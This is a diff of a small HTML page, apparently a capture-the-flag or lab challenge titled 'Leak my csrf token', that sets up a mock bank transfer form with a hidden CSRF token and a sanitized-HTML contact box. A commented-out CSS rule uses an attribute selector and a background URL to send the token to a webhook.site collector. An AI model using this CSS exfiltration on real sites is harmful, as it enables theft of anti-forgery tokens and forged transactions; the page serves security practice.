@@ -1,23 +1,46 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Leak my csrf token</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.5/purify.min.js"
+        integrity="sha512-/CUtA84sWWqWEBejNrrtWa7Yc4cth3Ome2ymvCKOo9YcZ4sh98tndUy4LutE2xGcAgD4fyz16y+gSyJdGCB5ww=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
     <!-- <style>
         form:has(input[name="csrf-token"][value="abcd-1234"]) {
-            background: url("https://webhook.site/...?tok2");
+            background: url("https://webhook.site/...?tok2=abcd-1234");
         }
     </style> -->
 </head>
+
 <body>
-    <h1>Bank hard</h1>
+    <h1>Bank harder</h1>
     <p>CSRF token as the last input, can you still leak it?</p>
     <form>
-        <input type="text" name="username" />
-        <input type="password" name="password" />
+        <input type="text" name="to" placeholder="Transfer to..." />
+        <input type="number" name="amount" placeholder="Amount" min="0" />
         <button type="submit">Submit</button>
         <input type="hidden" name="csrf-token" value="abcd-1234" />
     </form>
+    <h2>Contact our representatives</h2>
+    <form>
+        <textarea type="text" id="untrusted_input" placeholder="Send us a message..." cols="60" rows="15"></textarea>
+    </form>
+    <div id="output"></div>
 </body>
+
+<script>
+    const appendFunc = () => {
+        const untrusted_input = document.getElementById('untrusted_input').value;
+        const sanitized = DOMPurify.sanitize(untrusted_input);
+
+        const outputElement = document.getElementById("output");
+        outputElement.innerHTML = sanitized;
+    }
+    document.getElementById('untrusted_input').addEventListener('input', appendFunc);
+</script>
+
 </html>
